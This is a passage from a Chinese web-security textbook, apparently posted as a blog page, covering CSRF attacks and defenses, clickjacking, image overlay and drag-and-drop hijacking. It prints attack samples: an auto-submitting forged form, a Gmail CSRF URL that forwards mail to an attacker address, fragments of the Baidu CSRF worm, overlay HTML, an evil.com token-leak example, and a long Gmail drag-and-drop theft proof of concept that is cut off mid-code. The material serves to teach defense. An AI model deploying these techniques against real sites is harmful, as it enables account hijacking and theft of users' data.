<p>从风险的角度看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方。而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后的影响会更大。比如在网站首页发生的XSS攻击，肯定比网站合作伙伴页面的XSS攻击要严重得多。<br>在修补XSS漏洞时遇到的最大挑战之一是漏洞数量太多，因此开发者可能来不及，也不愿意修补这些漏洞。从业务风险的角度来重新定位每个XSS漏洞，就具有了重要的意义。</p>
<p><hr /></p>
<h3 id="3-4-小结"><a href="#3-4-小结" class="headerlink" title="3.4 小结"></a>3.4 小结</h3><p>理论上，XSS漏洞虽然复杂，但却是可以彻底解决的。在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。同时有很多开源项目为我们提供了参考。</p>
<p><hr /></p>
<h3 id="第4章-跨站点请求伪造（CSRF）"><a href="#第4章-跨站点请求伪造（CSRF）" class="headerlink" title="第4章　跨站点请求伪造（CSRF）"></a>第4章　跨站点请求伪造（CSRF）</h3><p>CSRF的全名是Cross Site Request Forgery，翻译成中文就是跨站点请求伪造。<br>它是一种常见的Web攻击，但很多开发者对它很陌生。CSRF也是Web安全中最容易被忽略的一种攻击方式，甚至很多安全工程师都不太理解它的利用条件与危害，因此不予重视。但CSRF在某些时候却能够产生强大的破坏性。</p>
<p><hr /></p>
<h3 id="4-2-1-浏览器的Cookie策略"><a href="#4-2-1-浏览器的Cookie策略" class="headerlink" title="4.2.1 浏览器的Cookie策略"></a>4.2.1 浏览器的Cookie策略</h3><p>浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“临时Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie”。<br>两者的区别在于，Third-party Cookie是服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了。</p>
<p>在浏览网站的过程中，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，Session Cookie也都是有效的。Session Cookie保存在浏览器进程的内存空间中；而Third-party Cookie则保存在本地。<br>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送。</p>
<p>这时再打开一个新的浏览器Tab页，访问同一个域中的不同页面。因为新Tab页在同一个浏览器进程中，因此Session Cookie将被发送。</p>
<p>此时在另外一个域中，有一个页面<code>http://www.b.com/csrf-test.html</code>，此页面构造了CSRF以访问www.a.com。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://www.a.com&quot; &gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<p>这时却会发现，只能发送出Session Cookie，而Third-party Cookie被禁止了。<br>只发送了Session Cookie</p>
<p>这是因为IE出于安全考虑，默认禁止了浏览器在 <code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 、<code>&lt;link&gt;</code>等标签中发送第三方Cookie。</p>
<p>再回过头来看看Firefox的行为。在Firefox中，默认策略是允许发送第三方Cookie的。</p>
<p>由此可见，在本章一开始所举的CSRF攻击案例中，因为用户的浏览器是Firefox，所以能够成功发送用于认证的Third-party Cookie，最终导致CSRF攻击成功。<br>而对于IE浏览器，攻击者则需要精心构造攻击环境，比如诱使用户在当前浏览器中先访问目标站点，使得Session Cookie有效，再实施CSRF攻击。</p>
<p>在当前的主流浏览器中，默认会拦截Third-party Cookie的有：IE 6、IE 7、IE 8、Safari；不会拦截的有：Firefox 2、Firefox 3、Opera、Google Chrome、Android等。</p>
<p>但若CSRF攻击的目标并不需要使用Cookie，则也不必顾虑浏览器的Cookie策略了。</p>
<p><hr /></p>
<h3 id="4-2-2-P3P头的副作用"><a href="#4-2-2-P3P头的副作用" class="headerlink" title="4.2.2 P3P头的副作用"></a>4.2.2 P3P头的副作用</h3><p>P3P Header是W3C制定的一项关于隐私的标准，全称是The Platform for Privacy Preferences。<br>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签也将不再拦截第三方Cookie的发送。<br>在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是很遗憾的是，P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，这并不符合“最小权限”原则。</p>
<p>正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。<br>很多时候，如果测试CSRF时发现<code>&lt;iframe&gt;</code>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。</p>
<p><hr /></p>
<h3 id="4-2-3-GET-POST"><a href="#4-2-3-GET-POST" class="headerlink" title="4.2.3 GET? POST?"></a>4.2.3 GET? POST?</h3><p>在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。<br>这种错误的观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST，而非$_POST获取变量，则会存在这个问题。</code></p>
<p>若服务器端未对请求方法进行限制，则这个请求会通过。<br>如果服务器端已经区分了GET与POST，那么攻击者有什么方法呢？对于攻击者来说，有若干种方法可以构造出一个POST请求。<br>最简单的方法，就是在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。比如，攻击者在www.b.com/test.html中编写如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</div><div class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;script&gt;</div><div class="line">var f = document.getElementById(&quot;register&quot;);</div><div class="line">f.inputs[0].value = &quot;test&quot;;</div><div class="line">f.inputs[1].value = &quot;passwd&quot;;</div><div class="line">f.submit();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>攻击者甚至可以将这个页面隐藏在一个不可见的iframe窗口中，那么整个自动提交表单的过程，对于用户来说也是不可见的。</p>
<p>在2007年的Gmail CSRF漏洞攻击过程中，安全研究者pdp展示了这一技巧。</p>
<p>首先，用户需要登录Gmail账户，以便让浏览器获得Gmail的临时Cookie。<br>用户登录Gmail</p>
<p>然后，攻击者诱使用户访问一个恶意页面。攻击者诱使用户访问恶意页面<br>在这个恶意页面中，隐藏了一个iframe，iframe的地址指向pdp写的CSRF构造页面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action</div><div class="line">=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=true&amp;cf2_email=evil</div><div class="line">inbox@mailinator.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1_has&amp;cf1_hasnot&amp;cf1_attach=true&amp;tfi&amp;</div><div class="line">s=z&amp;irf=on&amp;nvp_bu_cftb=Create%20Filter</div></pre></td></tr></table></figure>
<p>这个链接的实际作用就是把参数生成一个POST的表单，并自动提交。<br>由于浏览器中已经存在Gmail的临时Cookie，所以用户在iframe中对Gmail发起的这次请求会成功——邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中。<br>恶意站点通过CSRF在用户的Gmail中建立一条规则</p>
<p><hr /></p>
<h3 id="4-2-4-Flash-CSRF"><a href="#4-2-4-Flash-CSRF" class="headerlink" title="4.2.4 Flash CSRF"></a>4.2.4 Flash CSRF</h3><p>Flash也有多种方式能够发起网络请求，包括POST。比如下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import flash.net.URLRequest;</div><div class="line">import flash.system.Security;</div><div class="line">var url = new URLRequest(&quot;http://target/page&quot;);</div><div class="line">var param = new URLVariables();</div><div class="line">param = &quot;test=123&quot;;</div><div class="line">url.method = &quot;POST&quot;;</div><div class="line">url.data = param;</div><div class="line">sendToURL(url);</div><div class="line">stop();</div></pre></td></tr></table></figure>
<p>除了URLRequest外，在Flash中还可以使用getURL，loadVars等方式发起请求。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">req = new LoadVars();</div><div class="line">req.addRequestHeader(&quot;foo&quot;, &quot;bar&quot;);</div><div class="line">req.send(&quot;http://target/page?v1=123&amp;v2=456&quot;, &quot;_blank&quot;, &quot;GET&quot;);</div></pre></td></tr></table></figure>
<p>在IE 6、IE 7中，Flash发送的网络请求均可以带上本地Cookie；但是从IE 8起，Flash发起的网络请求已经不再发送本地Cookie了。</p>
<p><hr /></p>
<h3 id="4-2-5-CSRF-Worm"><a href="#4-2-5-CSRF-Worm" class="headerlink" title="4.2.5 CSRF Worm"></a>4.2.5 CSRF Worm</h3><p>CSRF Worm</p>
<p>2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。<br>漏洞出现在百度用户中心的发送短消息功能中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=用户账户&amp;co=消息内容</div></pre></td></tr></table></figure>
<p>只需要修改参数sn，即可对指定的用户发送短消息。而百度的另外一个接口则能查询出某个用户的所有好友：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://frd.baidu.com/?ct=28&amp;un=用户账户&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends</div></pre></td></tr></table></figure>
<p>将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Step 1：模拟服务器端取得request的参数。</div><div class="line">var lsURL=window.location.href;</div><div class="line">loU = lsURL.split(&quot;?&quot;);</div><div class="line">if (loU.length&gt;1)</div><div class="line">&#123;</div><div class="line">var loallPm = loU[1].split(&quot;&amp;&quot;);</div></pre></td></tr></table></figure>
<p>定义蠕虫页面服务器地址，取得?和&amp;符号后的字符串，从URL中提取感染蠕虫的用户名和感染者的好友用户名。</p>
<p>Step 2：好友json数据的动态获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var gotfriends = function (x)</div><div class="line">&#123;</div><div class="line">  for(i=0;i&lt;x[2].length;i++)</div><div class="line">  &#123;</div><div class="line">  friends.push(x[2][i][1]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">loadjson(&apos;&lt;script</div><div class="line">src=&quot;http://frd.baidu.com/?ct=28&amp;un=&apos;+lusername+&apos;&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback</div><div class="line">=gotfriends&amp;.tmp=&amp;1=2&quot;&gt;&lt;\/script&gt;&apos;);</div></pre></td></tr></table></figure>
<p>通过CSRF漏洞从远程加载受害者的好友json数据，根据该接口的json数据格式，提取好友数据为蠕虫的传播流程做准备。</p>
<p>Step 3：感染信息输出和消息发送的核心部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">evilurl=url+&quot;/wish.php?from=&quot;+lusername+&quot;&amp;to=&quot;;</div><div class="line">sendmsg=&quot;http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=[user]&amp;co=[evilmsg]&quot;</div><div class="line">for(i=0;i&lt;friends.length;i++)&#123;</div><div class="line">mysendmsg=mysendmsg+&quot;&amp;&quot;+i;</div><div class="line">eval(&apos;x&apos;+i+&apos;=new Image();x&apos;+i+&apos;.src=unescape(&quot;&quot;+mysendmsg+&apos;&quot;);&apos;);</div></pre></td></tr></table></figure>
<p>将感染者的用户名和需要传播的好友用户名放到蠕虫链接内，然后输出短消息。</p>
<p>这个蠕虫很好地展示了CSRF的破坏性——即使没有XSS漏洞，仅仅依靠CSRF，也是能够发起大规模蠕虫攻击的。</p>
<p><hr /></p>
<h3 id="4-3-1-验证码"><a href="#4-3-1-验证码" class="headerlink" title="4.3.1 验证码"></a>4.3.1 验证码</h3><h3 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h3><p><hr /></p>
<h3 id="4-3-1-验证码-1"><a href="#4-3-1-验证码-1" class="headerlink" title="4.3.1　验证码"></a>4.3.1　验证码</h3><p>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。<br>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p>
<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
<p><hr /></p>
<h3 id="4-3-2-Referer-Check"><a href="#4-3-2-Referer-Check" class="headerlink" title="4.3.2 Referer Check"></a>4.3.2 Referer Check</h3><p>Referer Check在互联网中最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”。<br>常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。</p>
<p>比如一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。</p>
<p>即使我们能够通过检查Referer是否合法来判断用户是否被CSRF攻击，也仅仅是满足了防御的充分条件。Referer Check的缺陷在于，服务器并非什么时候都能取到Referer。很多用户出于隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，比如从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。</p>
<p>出于以上种种原因，我们还是无法依赖于Referer Check作为防御CSRF的主要手段。但是通过Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p>
<p><hr /></p>
<h3 id="4-3-3-Anti-CSRF-Token"><a href="#4-3-3-Anti-CSRF-Token" class="headerlink" title="4.3.3 Anti CSRF Token"></a>4.3.3 Anti CSRF Token</h3><p>Anti CSRF Token</p>
<p>现在业界针对CSRF的防御，一致的做法是使用一个Token</p>
<p>CSRF的本质</p>
<p>CSRF为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。<br>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求；反之，攻击者将无法攻击成功。</p>
<p>出于这个原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数值。这是“不可预测性原则”的一种应用（参考“我的安全世界观”一章）。<br>比如，一个删除操作的URL是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=abc&amp;item=123</div></pre></td></tr></table></figure>
<p>把其中的username参数改成哈希值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=md5(salt+abc)&amp;item=123</div></pre></td></tr></table></figure>
<p>这样，在攻击者不知道salt的情况下，是无法构造出这个URL的，因此也就无从发起CSRF攻击了。而对于服务器来说，则可以从Session或Cookie中取得“username=abc”的值，再结合salt对整个请求进行验证，正常请求会被认为是合法的。</p>
<p>但是这个方法也存在一些问题。首先，加密或混淆后的URL将变得非常难读，对用户非常不友好。其次，如果加密的参数每次都改变，则某些URL将无法再被用户收藏。最后，普通的参数如果也被加密或哈希，将会给数据分析工作带来很大的困扰，因为数据分析工作常常需要用到参数的明文。</p>
<p>因此，我们需要一个更加通用的解决方案来帮助解决这个问题。这个方案就是使用Anti CSRF Token。</p>
<p>回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token的值是随机的，不可预测：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</div></pre></td></tr></table></figure>
<p>Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器（物理随机，请参考“加密算法与随机数”一章）。Token应该作为一个“秘密”，为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。<br>由于Token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。</p>
<p>Token需要同时放在表单和Session中。在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。</p>
<p>如下这个表单中，Token作为一个隐藏的input字段，放在form中：隐藏字段中的Token<br>同时Cookie中也包含了一个Token：Cookie中的Token</p>
<p>Anti CSRF Token在使用时，有若干注意事项。</p>
<p>防御CSRF的Token，是根据“不可预测性原则”设计的方案，所以Token的生成一定要足够随机，需要使用安全的随机数生成器生成Token。<br>此外，这个Token的目的不是为了防止重复提交。所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗掉前都使用同一个Token。但是如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。<br>如果Token保存在Cookie中，而不是服务器端的Session中，则会带来一个新的问题。如果一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑生成多个有效的Token，以解决多页面共存的场景。<br>最后，使用Token时应该注意Token的保密性。Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。比如以下页面：<br><a href="http://host/path/manage?username=abc&amp;token=[random">http://host/path/manage?username=abc&amp;token=[random</a>]<br>这个manage页面是一个用户面板，用户需要在这个页面提交表单或者单击“删除”按钮，才能完成删除操作。<br>在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</div><div class="line">则“http://host/path/manage?username=abc&amp;token=[random]”会作为HTTP请求的Referer发送到evil.com的服务器上，从而导致Token泄露。</div></pre></td></tr></table></figure>
<p>因此在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交，可以避免Token泄露。<br>此外，还有一些其他的途径可能导致Token泄露。比如XSS漏洞或者一些跨域漏洞，都可能让攻击者窃取到Token的值。<br>CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。这个过程可以称之为XSRF，和CSRF以示区分。</p>
<p>XSS带来的问题，应该使用XSS的防御方案予以解决，否则CSRF的Token防御就是空中楼阁。安全防御的体系是相辅相成、缺一不可的。</p>
<p><hr /></p>
<h3 id="4-4-小结"><a href="#4-4-小结" class="headerlink" title="4.4 小结"></a>4.4 小结</h3><p>本章介绍了Web安全中的一个重要威胁：CSRF攻击。CSRF攻击也能够造成严重的后果，不能忽略或轻视这种攻击方式。<br>CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的防御方案必须先理解CSRF攻击的原理和本质。<br>根据“不可预测性原则”，我们通常使用Anti CSRF Token来防御CSRF攻击。在使用Token时，要注意Token的保密性和随机性。</p>
<p><hr /></p>
<h3 id="第5章-点击劫持（ClickJacking）"><a href="#第5章-点击劫持（ClickJacking）" class="headerlink" title="第5章　点击劫持（ClickJacking）"></a>第5章　点击劫持（ClickJacking）</h3><p>2008年，安全专家Robert Hansen与 Jeremiah Grossman发现了一种被他们称为“ClickJacking”（点击劫持）的攻击，这种攻击方式影响了几乎所有的桌面平台，包括IE、Safari、Firefox、Opera以及Adobe Flash。两位发现者准备在当年的OWASP安全大会上公布并进行演示，但包括Adobe在内的所有厂商，都要求在漏洞修补前不要公开此问题。</p>
<p><hr /></p>
<h3 id="5-1-什么是点击劫持"><a href="#5-1-什么是点击劫持" class="headerlink" title="5.1 什么是点击劫持"></a>5.1 什么是点击劫持</h3><p>什么是点击劫持<br>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</p>
<p>点击劫持攻击与CSRF攻击（详见“跨站点请求伪造”一章）有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作。但是在CSRF攻击的过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成。与之相反的是，点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面。</p>
<p>twitter也曾经遭受过“点击劫持攻击”。安全研究者演示了一个在别人不知情的情况下发送一条twitter消息的POC，其代码与上例中类似，但是POC中的iframe地址指向了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;iframe scrolling=&quot;no&quot; src=&quot;http://twitter.com/home?status=Yes, I did click the button!!!</div><div class="line">(WHAT!!??)&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<p>在twitter的URL里通过status参数来控制要发送的内容。攻击者调整页面，使得Tweet按钮被点击劫持。当用户在测试页面点击一个可见的button时，实际上却在不经意间发送了一条微博。</p>
<p><hr /></p>
<h3 id="5-2-Flash点击劫持"><a href="#5-2-Flash点击劫持" class="headerlink" title="5.2 Flash点击劫持"></a>5.2 Flash点击劫持</h3><p>下面来看一个更为严重的ClickJacking攻击案例。攻击者通过Flash构造出了点击劫持，在完成一系列复杂的动作后，最终控制了用户电脑的摄像头。</p>
<p>攻击者制作了一个Flash游戏，并诱使用户来玩这个游戏。这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。演示点击劫持的Flash游戏<br>在其上隐藏了一个看不见的iframe：Flash上隐藏的iframe窗口<br>游戏中的某些点击是有意义的，某些点击是无效的。攻击通过诱导用户鼠标点击的位置，能够完成一些较为复杂的流程。某些点击是无意义的<br>某些点击是无意义的<br>最终通过这一步步的操作，打开了用户的摄像头。</p>
<p><hr /></p>
<h3 id="5-3-图片覆盖攻击"><a href="#5-3-图片覆盖攻击" class="headerlink" title="5.3 图片覆盖攻击"></a>5.3 图片覆盖攻击</h3><p>图片覆盖攻击<br>点击劫持的本质是一种视觉欺骗。顺着这个思路，还有一些攻击方法也可以起到类似的作用，比如图片覆盖。<br>一名叫sven.vetsch的安全研究者最先提出了这种Cross Site Image Overlaying攻击，简称XSIO。sven.vetsch通过调整图片的style使得图片能够覆盖在他所指定的任意位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;http://disenchant.ch&quot;&gt;</div><div class="line">&lt;img src=http://disenchant.ch/powered.jpg</div><div class="line">style=position:absolute;right:320px;top:90px;/&gt;</div><div class="line">&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>如下所示，覆盖前的页面是：</p>
<p>覆盖前的页面<br>覆盖后的页面变成：<br>覆盖后的页面<br>页面里的logo图片被覆盖了，并指向了sven.vetsch的网站。如果用户此时再去点击logo图片，则会被链接到sven.vetsch的网站。如果这是一个钓鱼网站的话，用户很可能会上当。<br>XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。<br>百度空间也曾经出现过这个问题，构造代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;/table&gt;&lt;a href=&quot;http://www.ph4nt0m.org&quot;&gt;</div><div class="line">&lt;img src=&quot;http://img.baidu.com/hi/img/portraitn.jpg&quot;</div><div class="line">style=&quot;position:absolute;left:123px;top:123px;&quot;&gt;</div><div class="line">&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>一张头像图片被覆盖到logo处：一张头像图片被覆盖到Logo处<br>点击此图片的话，会被链接到其他网站。<br>图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思，在这种情况下，不需要用户点击，也能达到欺骗的目的。<br>比如，利用XSIO修改页面中的联系电话，可能会导致很多用户上当。<br>由于<img>标签在很多系统中是对用户开放的，因此在现实中有非常多的站点存在被XSIO攻击的可能。在防御XSIO时，需要检查用户提交的HTML代码中，<img>标签的style属性是否可能导致浮出。</p>
<p><hr /></p>
<h3 id="5-4-拖拽劫持与数据窃取"><a href="#5-4-拖拽劫持与数据窃取" class="headerlink" title="5.4 拖拽劫持与数据窃取"></a>5.4 拖拽劫持与数据窃取</h3><p>拖拽劫持与数据窃取<br>2010年，ClickJacking技术有了新的发展。一位名叫Paul Stone的安全研究者在BlackHat 2010大会上发表了题为“Next Generation Clickjacking”的演讲。在该演讲中，提出了“浏览器拖拽事件”导致的一些安全问题。<br>目前很多浏览器都开始支持Drag &amp; Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此拖拽是不受同源策略限制的。<br>“拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中“拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。</p>
<p>在JavaScript或者Java API的支持下，这个攻击过程会变得非常隐蔽。因为它突破了传统ClickJacking一些先天的局限，所以这种新型的“拖拽劫持”能够造成更大的破坏。</p>
<p>国内的安全研究者xisigr曾经构造了一个针对Gmail的POC，其过程大致如下。首先，制作一个网页小游戏，要把小球拖拽到小海豹的头顶上。<br>演示拖拽劫持的网页小游戏<br>实际上，在小球和小海豹的头顶上都有隐藏的iframe。<br>在这个例子中，xisigr使用event.dataTransfer.getData(‘Text’)来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。原理示意图<br>这个例子的源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;title&gt;</div><div class="line">      Gmail Clickjacking with drag and drop Attack Demo</div><div class="line">    &lt;/title&gt;</div><div class="line">    &lt;style&gt;</div><div class="line">      .iframe_hidden&#123;height: 50px; width: 50px; top:360px; left:365px; overflow:hidden;</div><div class="line">      filter: alpha(opacity=0); opacity:.0; position: absolute; &#125; .text_area_hidden&#123;</div><div class="line">      height: 30px; width: 30px; top:160px; left:670px; overflow:hidden; filter:</div><div class="line">      alpha(opacity=0); opacity:.0; position: absolute; &#125; .ball&#123; top:350px; left:350px;</div><div class="line">      position: absolute; &#125; .ball_1&#123; top:136px; left:640px; filter: alpha(opacity=0);</div><div class="line">      opacity:.0; position: absolute; &#125;.Dolphin&#123; top:150px; left:600px; position:</div><div class="line">      absolute; &#125;.center&#123; margin-right: auto;margin-left: auto;</div><div class="line">vertical-align:middle;text-align:center;</div><div class="line">      margin-top:350px;&#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">      function Init() &#123;</div><div class="line">        var source = document.getElementById(&quot;source&quot;);</div><div class="line">        var target = document.getElementById(&quot;target&quot;);</div><div class="line">        if (source.addEventListener) &#123;</div><div class="line">          target.addEventListener(&quot;drop&quot;, DumpInfo, false);</div><div class="line">        &#125; else &#123;</div><div class="line">          target.attachEvent(&quot;ondrop&quot;, DumpInfo);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      function DumpInfo(event) &#123;</div><div class="line">        showHide_ball.call(this);</div><div class="line">        showHide_ball_1.call(this);</div><div class="line">        var info = document.getElementById(&quot;info&quot;);</div><div class="line">        info.innerHTML += &quot;&lt;span style=&apos;color:#3355cc;font-size:13px&apos;&gt;&quot; +</div><div class="line">event.dataTransfer.getData(&apos;Text&apos;) + &quot;&lt;/span&gt;&lt;br&gt; &quot;;</div><div class="line">      &#125;</div><div class="line">      function showHide_frame() &#123;</div><div class="line">        var iframe_1 = document.getElementById(&quot;iframe_1&quot;);</div><div class="line">        iframe_1.style.opacity = this.checked ? &quot;0.5&quot;: &quot;0&quot;;</div><div class="line">        iframe_1.style.filter = &quot;progid:DXImageTransform.Microsoft.Alpha(opacity=&quot; +</div><div class="line">(this.checked ? &quot;50&quot;: &quot;0&quot;) + &quot;);&quot;</div><div class="line">      &#125;</div><div class="line">      function showHide_text() &#123;</div><div class="line">        var text_1 = document.getElementById(&quot;target&quot;);</div><div class="line">        text_1.style.opacity = this.checked ? &quot;0.5&quot;: &quot;0&quot;;</div><div class="line">        text_1.style.filter = &quot;progid:DXImageTransform.Microsoft.Alpha(opacity=&quot; +</div><div class="line">(this.checked ? &quot;50&quot;: &quot;0&quot;) + &quot;);&quot;</div><div class="line">      &#125;</div><div class="line">      function showHide_ball() &#123;</div><div class="line">        var hide_ball = document.getElementById(&quot;hide_ball&quot;);</div><div class="line">        hide_ball.style.opacity = &quot;0&quot;;</div><div class="line">        hide_ball.style.filter = &quot;alpha(opacity=0)&quot;;</div><div class="line">      &#125;</div><div class="line">      function showHide_ball_1() &#123;</div><div class="line">        var hide_ball_1 